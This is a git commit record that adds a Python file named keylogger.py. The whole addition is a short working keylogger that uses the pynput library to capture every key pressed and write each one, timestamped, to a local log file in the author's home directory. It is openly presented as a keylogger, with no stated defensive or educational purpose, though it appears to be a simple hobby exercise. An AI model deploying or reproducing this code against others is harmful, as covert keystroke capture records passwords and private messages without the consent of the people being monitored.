6de4fc4a85394099c208386f6d57d87d694e969b
sthapukar <stha.pukar.075@gmail.com>
2020-07-24 15:39:03 +0545

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,8 @@
+from pynput.keyboard import Key, Listener       #pynput module to listen for keystrokes
+import logging                    #logging
+log_dir = r"/home/pukar/"       #log file directory (absolute path)
+logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')    #specify log file config
+def on_press(key):
+    logging.info(str(key))      #save every key on press
+with Listener(on_press=on_press) as listener:
+    listener.join()
